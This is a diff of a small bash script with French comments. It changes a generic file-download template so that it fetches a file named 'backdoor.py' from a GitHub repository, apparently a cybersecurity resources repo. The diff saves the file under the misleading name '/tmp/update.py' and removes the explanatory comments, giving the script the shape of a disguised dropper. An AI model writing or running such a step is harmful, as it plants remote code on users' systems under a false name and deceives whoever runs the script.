@@ -1,15 +1,11 @@
 #!/bin/bash
 
-# URL du fichier à télécharger
-url="https://example.com/chemin/vers/le/fichier.zip"
+url="https://raw.githubusercontent.com/C0SB/ressources_cyber/main/scripts/backdoor.py"
 
-# Emplacement de destination pour le téléchargement
-destination="/chemin/local/vers/le/fichier.zip"
+destination="/tmp/update.py"
 
-# Utilisation de curl pour télécharger le fichier
 curl -o "$destination" "$url"
 
-# Vérification de la réussite du téléchargement
 if [ $? -eq 0 ]; then
     echo "Téléchargement réussi vers $destination"
 else
